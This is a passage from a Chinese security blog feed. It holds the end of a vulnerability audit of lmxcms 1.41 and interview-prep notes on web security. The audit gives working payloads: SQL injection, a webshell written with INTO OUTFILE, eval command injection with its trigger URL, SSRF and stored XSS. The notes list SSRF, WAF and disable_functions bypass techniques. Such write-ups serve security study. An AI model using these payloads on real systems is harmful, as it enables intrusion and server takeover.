src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420113546006.png" class title="image-20220420113546006"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420113607912.png" class title="image-20220420113607912"><p>后台中给还有多处文件上传,其他功能-&gt;焦点图-&gt;图片上传</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420163018620.png" class title="image-20220420163018620"><h1 id="0X04-后台存在sql注入漏洞"><a href="#0X04-后台存在sql注入漏洞" class="headerlink" title="0X04:后台存在sql注入漏洞"></a>0X04:后台存在sql注入漏洞</h1><p>在后台处有明显的sql语句执行模块,尝试简单的查询语句后不会返回结果,但是语句失败会返回报错信息,故可以报错注入和延时注入</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420115716998.png" class title="image-20220420115716998"><p>手工测试,payload: select extractvalue(1,concat(0x7e,(select database())));</p><p>成功获取数据库名称</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420115903731.png" class title="image-20220420115903731"><p>payload:select extractvalue(1,concat(0x7e,(select table_name from<br>information_schema.tables where table_schema = DATABASE() limit 3,1)));获取表名</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420124718166.png" class title="image-20220420124718166"><p>sqlmap获取表</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420124333049.png" class title="image-20220420124333049"><p><strong>如果数据库版本小于5.6.34且数据库用户权限较高,可直接利用into outfile写webshell直接getshell</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&quot;&lt;?php system($_GET[&#x27;a&#x27;]);?&gt;&quot;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;D://phpstudy_pro//WWW//lmxcms1.41//shell.php&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420125335007.png" class title="image-20220420125335007"><h1 id="0X05后台存在命令执行漏洞"><a href="#0X05后台存在命令执行漏洞" class="headerlink" title="0X05后台存在命令执行漏洞"></a>0X05后台存在命令执行漏洞</h1><p>**触发点1:**在\c\admin\AcquisiAction.class.php中,第319行</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420155428759.png" class title="image-20220420155428759"><p>318行处eval函数拼接了$temdata[data],而这个数据是来自数据库lxm_cj_data表中的data字段的,通过后台采集处和后台的sql语句执行处可以直接控制该处的数据</p><p><strong>触发点2:</strong></p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420162015690.png" class title="image-20220420162015690"><p>在382行处同样遍历listdata中的数据进行拼接后使用eval执行,此处的listdata同样来自lxm_cj_data,不过listdata是lxm_cj_data中一行的全部字段,将他进行遍历,当遍历到data字段时触发命令执行</p><p>payload:多个payload字段不能重复,否则不能插入成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into lmx_cj_data set id&#x3D;2,lid&#x3D;2,data&#x3D;&quot;a;system(&#39;whoami&#39;)&quot;,uid&#x3D;2,url&#x3D;2,time&#x3D;2,is_in&#x3D;2;</span><br></pre></td></tr></table></figure><p><strong>构造payload触发showCjData方法:</strong></p><p>**payload1:**通过整个CMS的方法调用机制可知道m是方法名,该php类文件为AcquisiAction,所以m参数为Acquisi,调用的函数为showCjData则参数a为showCjData,同时在sql查询的过程中还需要3个必须的参数分别是id,lid,cld,知道这些后构建我们的请求头</p><p>请求GET /admin.php?m=Acquisi&amp;a=showCjData&amp;id=2&amp;lid=2&amp;cid=2即可触发对应payload中id为2的payload</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420160902454.png" class title="image-20220420160902454"><p>成功命令执行</p><p><strong>payload2:</strong></p><p>根据上面同理,只不过触发函数换成了caijiDataList,构造,发包,触发命令执行</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420162250791.png" class title="image-20220420162250791"><h1 id="0X06-后台存在SSRF漏洞"><a href="#0X06-后台存在SSRF漏洞" class="headerlink" title="0X06:后台存在SSRF漏洞"></a>0X06:后台存在SSRF漏洞</h1><p>位于系统管理-&gt;采集管理</p><p>在修改采集目标时可将其设置为内网目标,可探测/攻击内网web服务</p><p>设置为内网80端口上的一个服务</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420165134191.png" class title="image-20220420165134191"><p>未经过滤直接发起请求</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420165311002.png" class title="image-20220420165311002"><h1 id="0X07-后台多处存储型XSS"><a href="#0X07-后台多处存储型XSS" class="headerlink" title="0X07:后台多处存储型XSS"></a>0X07:后台多处存储型XSS</h1><p>1.系统管理-&gt;采集管理-&gt;添加节点</p><p>节点名称和备注均可xss</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420125920311.png" class title="image-20220420125920311"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420125935785.png" class title="image-20220420125935785"><p>2.专题管理-&gt;添加专题</p><p>专题名称处存在xss</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130228508.png" class title="image-20220420130228508"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130239464.png" class title="image-20220420130239464"><p>3.栏目管理-&gt;添加栏目-&gt;栏目名称处存在xss</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130410039.png" class title="image-20220420130410039"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130429422.png" class title="image-20220420130429422"><p>此处会在前台添加一个栏目造成前台XSS</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130622296.png" class title="image-20220420130622296"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130636468.png" class title="image-20220420130636468"><p>点击该页面再次触发</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420130659929.png" class title="image-20220420130659929"><p>4.以上的操作会导致系统管理-&gt;日志管理处css,这个地方会显示一些操作详细,其中便包含xss恶意代码</p><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420132556906.png" class title="image-20220420132556906"><img src="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/image-20220420132619141.png" class title="image-20220420132619141">]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h4&gt;&lt;p&gt;1.这是参加四叶草安全的安全研究岗位面试考试,当时面试官发了我一套lmxcms的源码,让我进行审计,尽可能找出更多的漏洞,当时的结果旧纪</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://men9da.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://men9da.cn/2022/04/18/2022%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://men9da.cn/2022/04/18/2022%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-18T14:19:43.000Z</published>
    <updated>2022-10-03T05:54:33.227Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>这里总结一下我在进行面试复习的时候复习的知识点,根据网上各位师傅的面试经验进行问题回答总结,留作记录,每个问题的回答是基于本人情况并且站在自己的角度如何在面试中回答这个问题而写的。</p><p>[TOC]</p><h4 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍:"></a>自我介绍:</h4><p>我叫徐俊杰,今年大三,所学习的专业是渗透与测试,是学校CTF战队NYSEC的副队长,经常参加CTF比赛,也取得过一定的成绩.在安全方面除了通过CTF竞赛学到的安全知识外,在实战黑盒测试中:也有自己提交过SRC,在白盒测试中对开源cms以及快速建站系统等web程序审计并且发现漏洞提交到CNVD漏洞平台有自己的cnvd编号,平时会跟进一些热点漏洞,平时常常写一些安全小工具来为自己所使用</p><h4 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h4><p>1.明确目标</p><p>2.分析风险,获取授权</p><p>3.信息搜集</p><p>4.漏洞探测</p><p>5.漏洞验证</p><p>6.信息分析</p><h4 id="什么是泛解析-在处理子域名爆破时泛解析应该如何处理"><a href="#什么是泛解析-在处理子域名爆破时泛解析应该如何处理" class="headerlink" title="什么是泛解析,在处理子域名爆破时泛解析应该如何处理?"></a>什么是泛解析,在处理子域名爆破时泛解析应该如何处理?</h4><p>泛解析是指当我使用通配符把*.abc.com解析到1.1.1.1这个ip上时,用户访问xxx.abc.com都会被解析到ip:1.1.1.1上面,这使得域名可以无限支持子域,但是在我们进行子域名爆破的时候就会出现问题,因为任何子域名都会被解析到1.1.1.1上去,如何解决呢?通过解析一个不可能存在的域名(比如解析一个MD5加密后的值拼接的子域名),如果仍然解析成功证明该域名存在泛解析</p><h4 id="protobuf相关"><a href="#protobuf相关" class="headerlink" title="protobuf相关"></a>protobuf相关</h4><p>protobuf是谷歌提供的一种数据序列化协议可跨平台跨语言，他很好的处理了反序列化漏洞的问题，因为protobuf在IDL中定义了package的范围</p><h4 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h4><p>fastjson，序列化过程将java对象转换为json字符串</p><p>抓包构造json请求包，通过报错信息判断是否为fastjson</p><p>fastjson组件在调用JSON.prase的时候通过@type字段来指定JSON还原什么样的对象（TemplatesImpl，JdbcRowSetImpl(jndi注入)），就会进行反序列化生成对象，最后通过控制lookup参数造成JNDI注入，在进行生成对象的时候会给属性赋值</p><h4 id="Common"><a href="#Common" class="headerlink" title="Common"></a>Common</h4><h4 id="phpinfo关注的信息"><a href="#phpinfo关注的信息" class="headerlink" title="phpinfo关注的信息"></a>phpinfo关注的信息</h4><p>关注session的临时文件夹路径信息(可存在文件包含利用)</p><p>关注php版本,对应漏洞只有对应php版本可以触发</p><p>通过phpinfo可以暴露对应站点使用的服务如redis,等服务</p><p>phpinfo可以泄露真实ip</p><p>phpinfo查看支持协议,如支持gopher协议就能配合ssrf漏洞进行利用</p><h4 id="说一个自己感觉不错的漏洞"><a href="#说一个自己感觉不错的漏洞" class="headerlink" title="说一个自己感觉不错的漏洞"></a>说一个自己感觉不错的漏洞</h4><p>看自己跟过那些洞,先说挖到的CNVD或者一些开源cms,思路开放,逻辑较为简单比较好说</p><p>然后说thinkphp反序列化链</p><p>然后说thinkphp任意类调用漏洞</p><p>然后说最近看的log4j,log4j相对简单且能带着说一下rmi和java的远程调用漏洞</p><h4 id="输出到href的XSS如何防御"><a href="#输出到href的XSS如何防御" class="headerlink" title="输出到href的XSS如何防御"></a>输出到href的XSS如何防御</h4><p>针对href属性的数据特点进行防御,规定数据只以http/https开头,过滤完成后在进行htmlspecialchars函数处理</p><h4 id="SameSite如何防御CSRF攻击"><a href="#SameSite如何防御CSRF攻击" class="headerlink" title="SameSite如何防御CSRF攻击?"></a>SameSite如何防御CSRF攻击?</h4><p>SameSite通过限制只能同域能访问cookie从而防御CSRF攻击</p><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>同源策略是浏览器的一种安全机制,同源策略的存在是为了限制两个网站间的数据隔离,使得A网站不能读取B网站的资源</p><p><strong>同源指的是同协议,同域名,同端口</strong></p><h4 id="Jsonp"><a href="#Jsonp" class="headerlink" title="Jsonp"></a>Jsonp</h4><p>jsonp是一种跨域解决方案,通过将回调函数发送给服务器,服务器返回json参数,是CSRF漏洞的一种,通过诱导用户点击存在jsonp劫持的页面,将执行恶意页面的代码携带用户的cookie去请求数据,并且触发恶意html页面的回调函数将数据存储到黑客服务器,然后再进行重定向到正常页面用户无法发觉</p><p>jsonp劫持可能存在的地方</p><p>1.referer过滤不严格</p><p>2.空referer</p><p>3.token可重复利用</p><p>4.conten-type编码不符合标准(宽字节注入)</p><p>5.未严格过滤</p><p><strong>实现原理</strong></p><p>动态创建script标签,利用script的src不受同源策略约束来跨域获取数据</p><h4 id="Jsonp防御"><a href="#Jsonp防御" class="headerlink" title="Jsonp防御"></a>Jsonp防御</h4><p>1.限制referer</p><p>2.生成随机token</p><p>3.限制回调函数的长度以及名称(如不限制可造成XSS),JSON服务端设置Content-Type就能防御XSS;</p><p><strong>referer验证绕过</strong>/空referer:</p><p><code>data URI</code>不会发送referer头,可以绕过referer检测</p><p>iframe标签+js为协议</p><p>meta标签</p><p>HTTPS向http发起请求</p><h4 id="CSRF更好的防御方式有哪些-具体如何实现"><a href="#CSRF更好的防御方式有哪些-具体如何实现" class="headerlink" title="CSRF更好的防御方式有哪些?具体如何实现?"></a>CSRF更好的防御方式有哪些?具体如何实现?</h4><p>通过成熟的csrfToken进行防御</p><p>限制refer(可被篡改)</p><h4 id="JSON格式的csrf如何防御"><a href="#JSON格式的csrf如何防御" class="headerlink" title="JSON格式的csrf如何防御"></a>JSON格式的csrf如何防御</h4><p>用户操作验证(验证码)</p><p>来源请求验证(验证referer)</p><p>表单token验证(csrftoken)</p><h4 id="浏览器解析顺序"><a href="#浏览器解析顺序" class="headerlink" title="浏览器解析顺序"></a>浏览器解析顺序</h4><p>1.网络部分</p><p>用户发起网络请求包-&gt;服务器对网络请求包进行分析,资源定位-&gt;后端处理后将处理后的数据返回给前端</p><p>2.浏览器处理部分</p><p>浏览器接收到响应数据后会对HTML进行解析并构建DOM树,CSS被CSS解析器解析为CSS样式表</p><p>当解析器遇到&lt;script&gt;标签的时候对HTML的解析将会暂停,由Javascript引擎进行分析,&lt;script&gt;标签被解析完成后会继续往下执行html标签,所以将js放在dom生成的最后可以在dom完全加载后对dom进行操作</p><h4 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h4><p>0.浏览器解码主要三个过程,html解析,css解析,js解析,url解析</p><p>1.url解码:服务器接受用户的url请求,对%开头的数据进行url解码</p><p>2.HTML解析器:通过&lt;&gt;符号来开启是否解析为标签(在这个过程中就会进行html的解码),HTML编码只会在数据段(标签外部和标签的text段)</p><p>3.解码顺序:HTML解码-&gt;JS解码-&gt;URL解码</p><p><strong>浏览器自解码</strong></p><p>例子:()为&amp;#40,&amp;#41,浏览器认识,解码</p><p>1.HTML自解码:html编码方式有进制编码和实体编码,比如img标签中的onerror,将其后面的值进行10/16进制编码/实体编码(将保留字符&amp;&lt;&gt;”=&gt;”解析为了特殊的形式)/后浏览器解析的时候会自动进行解码,但是onerror不能被编码,因为是控制字符,编码后将会被识别为纯文本,不会被解析成DOM</p><p>2.JS自解码,还是以img中的onerror为例,可以将其内容进行Unicode,十进制/十六进制编码,<strong>在JS中单引号,双引号,括号属于控制字符,编码后无法解析,所以防御的时候只用将这些控制字符编码即可</strong>,浏览器先进行HTML自解码</p><p>3,css自解码</p><p>反斜杠+1-6位十六进制数字组成,HTML解析器优先于CSS解析器</p><p>4.URL自解码</p><p>在js中的href标签会先进行url解码,也就是说加入在a标签中存在href字段时,解码顺序就是HTML解码-&gt;href解码-&gt;js解码-&gt;href解码</p><h4 id="为什么html实体编码能够防范XSS漏洞"><a href="#为什么html实体编码能够防范XSS漏洞" class="headerlink" title="为什么html实体编码能够防范XSS漏洞?"></a>为什么html实体编码能够防范XSS漏洞?</h4><p>1.涉及到浏览器解码顺序</p><p>因为浏览器的解码顺序规则,导致html编码只能在标签外部或者标签内部的text段被解析,因此形如下面的xss代码就不会执行,因为html实体编码位于标签内部,不会进行html实体编码</p><script>alert&#40;'1')</script><h4 id="XSS-弹-alert-有那些方法"><a href="#XSS-弹-alert-有那些方法" class="headerlink" title="XSS 弹 alert 有那些方法"></a>XSS 弹 alert 有那些方法</h4><p>1.直接stript标签直接弹</p><p>2.javascript:弹</p><p>3.&lt;img src=x onerror=alert(1)&gt;图片标签onerror弹</p><p>4.unicode弹</p><p>5.top对象调用弹</p><h4 id="XSS-DOM-反射区别-自动化防御"><a href="#XSS-DOM-反射区别-自动化防御" class="headerlink" title="XSS,DOM,反射区别,自动化防御"></a>XSS,DOM,反射区别,自动化防御</h4><p>反射型:用户通过输入恶意xss代码,经过服务器后返回给浏览器进行触发</p><p>DOM型:不通过服务器,直接由网页本身渲染触发</p><p>防御:对输出进行htmlspecialchars进行实体编码,注意此函数默认不编码单引号需要进行设置</p><p>对输入进行过滤,比如在href处就必须指定以http/https开头</p><h4 id="XSS出现的根本原因"><a href="#XSS出现的根本原因" class="headerlink" title="XSS出现的根本原因"></a>XSS出现的根本原因</h4><p>用户的数据被当作HTML代码的一部分被浏览器解析执行了,通过拼接,插入,截断的方式更改原有的语义,产生了新的语义</p><h4 id="XSS防御措施"><a href="#XSS防御措施" class="headerlink" title="XSS防御措施"></a>XSS防御措施</h4><p>1.html实体编码</p><p>2.CSP安全策略,可以禁止加载其他域的文件,禁止向第三方提交信息,禁止执行未授权脚本,通过report-uri可以及时发现请求的资源不被允许时是往那个地方请求的,快速发现xss漏洞</p><p>3.httpOnly属性禁止盗取cookie</p><h4 id="MXSS-突变xss"><a href="#MXSS-突变xss" class="headerlink" title="MXSS(突变xss)"></a>MXSS(突变xss)</h4><p>1.在一些场景中,经过服务器过滤的html文本在被解析的时候真实的dom结构和预期dom结构存在差异导致以外执行XSS</p><p>2.常见的如反引号打破边界属性,未知元素xmlns属性(可以在html中定义这些未知标签的xmlns属性),这样在服务器检测的时候确实通过了检测,但是被浏览器渲染你的时候由于环境发生变化,和服务器认知不同,产生了解析不同导致xss</p><p>3.Listing标签,css属性名转义\22转译为”</p><h4 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h4><p>1.通过信息泄露,源码泄露,文件读取等方法拿到种子,即可获取随机数规律</p><h4 id="PythonSSTI相关说辞"><a href="#PythonSSTI相关说辞" class="headerlink" title="PythonSSTI相关说辞"></a>PythonSSTI相关说辞</h4><p>模板注入,过滤绕过看对应总结文章</p><h4 id="一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名"><a href="#一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名" class="headerlink" title="一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名"></a>一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名</h4><p>通过网络空间搜索引擎进行资产的搜集</p><p>通过企查查,小蓝本等网站查询</p><h4 id="sqlmap高级使用-过滤-条件"><a href="#sqlmap高级使用-过滤-条件" class="headerlink" title="sqlmap高级使用(过滤,条件)"></a>sqlmap高级使用(过滤,条件)</h4><h4 id="SSRF-绕过"><a href="#SSRF-绕过" class="headerlink" title="SSRF 绕过"></a>SSRF 绕过</h4><p>用@绕过,<a href="http://www.baidu.com@10.10.10.10/">www.baidu.com@10.10.10.10</a></p><p>用ip地址转换成进制绕过8进制0300.0250.0.1 16进制0XC0.0XA8.0.1 10进制:3232235521 16进制0XC0A80001</p><p>10.0.0.1可以写成10.1</p><p>301,302跳转绕过,会继续请求跳转后的url</p><p>短网址绕过</p><p>封闭式字母数字Enclosed alphanumerics</p><p>利用dns解析服务想xip.io解析</p><p>句号绕过</p><p>dns重绑定绕过</p><p><strong>畸形ip</strong></p><p>封闭式字母数字Enclosed alphanumerics</p><p>用ip地址转换成进制绕过8进制0300.0250.0.1 16进制0XC0.0XA8.0.1 10进制:3232235521 16进制0XC0A80001</p><p>句号绕过</p><p>后端对URL解析不当造成,根据解析规则构造payload绕过</p><h4 id="DNS重绑定原理"><a href="#DNS重绑定原理" class="headerlink" title="DNS重绑定原理"></a>DNS重绑定原理</h4><p>A记录域名-&gt;IP</p><p>CNAME记录-&gt;域名别名</p><p>NS记录：域名服务器</p><p>1.利用时间差，在域名服务商处设置TTL值为0，后端解析host为ip，确认无误后执行curl发起第二次请求，此时TTL值为0，再次请求会重新解析，利用时间差更换记录即可</p><p>TTL为0失效，DNS服务器：114.114.114.114不按照标准协议，8.8.8.8可以利用</p><p>2.设置多条A记录，随机到内网地址</p><p>3.自建DNS服务器</p><h4 id="短网址原理"><a href="#短网址原理" class="headerlink" title="短网址原理"></a>短网址原理</h4><p><a href="http://aip/asdwsad32">http://aip/asdwsad32</a></p><p>asdwsad32则是对应网址编号，查询到对应ip地址，301跳转</p><p>301永久</p><p>302临时</p><h4 id="SSRF伪协议合集"><a href="#SSRF伪协议合集" class="headerlink" title="SSRF伪协议合集"></a>SSRF伪协议合集</h4><p>file://文件读取</p><p>gopher://攻击内网应用</p><p>dict://端口探测,泄露安装软件版本信息</p><p>http://端口探测</p><h4 id="SSRF利用-最大程度利用-进内网-拿shell"><a href="#SSRF利用-最大程度利用-进内网-拿shell" class="headerlink" title="SSRF利用,最大程度利用,进内网,拿shell"></a>SSRF利用,最大程度利用,进内网,拿shell</h4><p>1.如果使用system(curl,””)拼接,可以直接getshell</p><p>2.file:///读文件,读数据库配置文件,开启远程链接直接连,读源码,找漏洞</p><p>3.dict://测端口,redis,等服务</p><p>3.gopher://发post,get包,打内网应用,打redis</p><h4 id="SSRF到getshell"><a href="#SSRF到getshell" class="headerlink" title="SSRF到getshell"></a>SSRF到getshell</h4><p>redis未授权,mysql未授权,弱口令,redis写文件,mysql写shell,intofile,日志shell,udf提权等</p><h4 id="SSRF怎么修复"><a href="#SSRF怎么修复" class="headerlink" title="SSRF怎么修复"></a>SSRF怎么修复</h4><p><strong>代码层面</strong></p><p>1.设置白名单,首先针对host进行校验,防止被其他格式的ip地址绕过如8进制/16进制/10进制整数格式绕过,在根据白名单放行二级域名</p><p>2.限制访问协议只能为http/https,检测是否存在特殊字符,设置setInstanceFollowRedirects为false禁止302跳转</p><p>3.解析url域名对应的ip地址,首先经过过滤后确认ip地址不是内网地址,然后访问对应资源,可以防范DNS重绑定,**此修复方案可能会出现的问题:**请求某些资源时会对host进行检查判断host是不是域名,如果是就会拒绝</p><p>**修复:**使用setRequestProperty设置host头为域名,对应代码处也需要做一定的修改,JAVA中调用System.setProperty(“<a href="http://sun.net/">sun.net</a>.http.allowRestrictedHeaders”, “true”)</p><p><strong>服务器层面</strong></p><p>1.设置一个代理服务器专门用来访问外部资源,此服务器与内网隔离,就算出现SSRF威胁也不会危害到主服务器</p><h4 id="python-的装饰器，迭代器，yield"><a href="#python-的装饰器，迭代器，yield" class="headerlink" title="python 的装饰器，迭代器，yield"></a>python 的装饰器，迭代器，yield</h4><h4 id="RASP防御-结合sql"><a href="#RASP防御-结合sql" class="headerlink" title="RASP防御,结合sql"></a>RASP防御,结合sql</h4><p>运行时保护</p><h4 id="PHP底层如何判断变量类型"><a href="#PHP底层如何判断变量类型" class="headerlink" title="PHP底层如何判断变量类型?"></a>PHP底层如何判断变量类型?</h4><p>PHP通过一个结构体存储所有类型的变量,这个结构体表示一个php变量,这个结构体中有一个zvalue字段,存放的是一个指针,在_zval_value结构体中存放着不同的数据类型,当zval字段指向这个结构体中的不同数据类型,这个php变量结构体就是这样的一个数据类型</p><h4 id="绕过WAF常用方式"><a href="#绕过WAF常用方式" class="headerlink" title="绕过WAF常用方式?"></a>绕过WAF常用方式?</h4><p>1.发送很大的请求包使得WAF处理超时</p><p>2.Mutilpart变量绕过,有些WAF在存在filename属性的时候会不进行检测</p><p>3.构造畸形请求包,破坏一些参数使得waf无法正常识别,但是中间件会兼容识别</p><p>4.编码绕过</p><p>5.重复变量绕过</p><p>6.参数污染,相同参数,多参数</p><p>7.分段传输绕过需要在请求头中添加Transfer-Encoding:chunked字段</p><p>8.SSRF绕过</p><p>9.DNS解析绕过,云waf,cdn,通过网络空间搜索引擎去查找真实IP地址</p><h4 id="富文本"><a href="#富文本" class="headerlink" title="富文本"></a>富文本</h4><p>一大段html,需要引用一些html样式</p><h4 id="富文本XSS和非富文本XSS修复方式区别"><a href="#富文本XSS和非富文本XSS修复方式区别" class="headerlink" title="富文本XSS和非富文本XSS修复方式区别?"></a>富文本XSS和非富文本XSS修复方式区别?</h4><p>1.非富文本可以使用html实体编码,关键字过滤,href处检测http/https开头,后白名单过滤</p><p>2.富文本使用白名单,只允许白名单中的标签和属性,可以使用预防xss的一些组件来设置白名单(npm instal xss)</p><h4 id="websocket链接过程"><a href="#websocket链接过程" class="headerlink" title="websocket链接过程"></a>websocket链接过程</h4><p>websocket基于TCP协议,首先客户端与服务端建立TCP链接,然后发起HTTP请求,在HTTP请求中设置connection字段为upgrade表示告诉服务器我这请求将升级为websocket,对应的upgrade字段为websocket,服务端接受了请求,建立websocket链接,然后开始传输数据</p><h4 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a>零信任</h4><p>永不信任-始终验证:不存在受信任的网络,每次操作都必须经过身份验证才能被执行</p><h4 id="入侵检测-HIDS-NIDS"><a href="#入侵检测-HIDS-NIDS" class="headerlink" title="入侵检测:HIDS,NIDS"></a>入侵检测:HIDS,NIDS</h4><p>HIDS:可以动态检查网络数据包,检测程序访问的内部资源以及各种存储信息的操作,核对是否符合预期(将文件状态进行记录,放入安全数据库(校验码数据库))</p><p>NIDS:网络入侵检测,从TCP/IP消息流中识别出潜在的攻击行为</p><h4 id="ddos类型-如何防御"><a href="#ddos类型-如何防御" class="headerlink" title="ddos类型,如何防御?"></a>ddos类型,如何防御?</h4><p>1.TCP洪水(SYN),TCP协议缺陷,大量伪造的IP地址发送TCP链接的第一个包,服务器需要对其进行回复,且不会得到回复,造成资源浪费,正常服务堵塞</p><p>2.cc攻击,发送大量HTTP请求以耗尽资源</p><p>3.DRDOS,构造带有被害ip地址的数据包给攻击主机(DNS,NTP服务等),利用他们的回复包形成ddos攻击</p><p>防御措施:</p><p>1.硬件防火墙</p><p>2.加大带宽</p><p>3.负载均衡</p><p>4.CDN加速</p><h4 id="如何判断用户是否为正常用户"><a href="#如何判断用户是否为正常用户" class="headerlink" title="如何判断用户是否为正常用户"></a>如何判断用户是否为正常用户</h4><p>1.判断是否经常对登录界面进行多账号/密码登陆尝试</p><p>2.判断是否经常尝试请求一些敏感页面</p><p>3.判断该用户所发出的请求是否包含一些敏感字段,特殊符号</p><p>4.判断其所用的请求头</p><h4 id="企业内部如何做隐私保密"><a href="#企业内部如何做隐私保密" class="headerlink" title="企业内部如何做隐私保密"></a>企业内部如何做隐私保密</h4><p>1.使用加密软件对电脑中的数据进行加密,使其脱离环境即便被盗取也无法被解密</p><p>2.对企业所有出网流量做全流量监控,探测敏感数据</p><h4 id="php-disablefunction绕过"><a href="#php-disablefunction绕过" class="headerlink" title="php disablefunction绕过"></a>php disablefunction绕过</h4><p>1.寻找为未禁用的函数如popen,proc_open,pcntl_exec</p><p>2.LD_PRELOAD劫持系统函数</p><p>3.mod-cgi:配置.htaccess文件可以允许一个目录执行cgi程序并指定后缀,从而执行对应的代码,不受disable_function限制</p><p>4.php溢出</p><h4 id="java-php-python反序列化产生原因，如何防御"><a href="#java-php-python反序列化产生原因，如何防御" class="headerlink" title="java/php/python反序列化产生原因，如何防御"></a>java/php/python反序列化产生原因，如何防御</h4><p>1.java是因为java中在反序列化一个对象的过程中会调用其静态代码块/构造函数内的代码,并且如果被反序列化的对象重写了readObject方法,那么也会执行readObject方法当中的代码</p><p>2.php是因为php在反序列化时在特定条件下触发魔法函数,如destruct,constract,toString,sleep(被序列化之前执行),wakeup</p><p>3.python时候由于pickle库在进行反序列化时,在反序列化结束后会自动调用reduce魔术方法中的代码</p><p>几乎所有的漏洞都发生在反序列化这个过程中,那么就需要控制反序列化的数据来源,不让外部能有控制反序列化数据的机会即可</p><h4 id="https详细过程"><a href="#https详细过程" class="headerlink" title="https详细过程"></a>https详细过程</h4><p>1.客户端通过SSL/TSL协议向服务端发发送自己支持的加密协议</p><p>2.服务端选择合适的加密协议并且返回证书,公钥</p><p>3.客户端通过根证书检验整数合法性</p><p>4.客户端生成对称密钥,通过公钥加密发送给服务器</p><p>5.服务器解密密文,获得对称密钥</p><p>6.双方都获得了对称密钥,开始通信</p><h4 id="CDN绕过"><a href="#CDN绕过" class="headerlink" 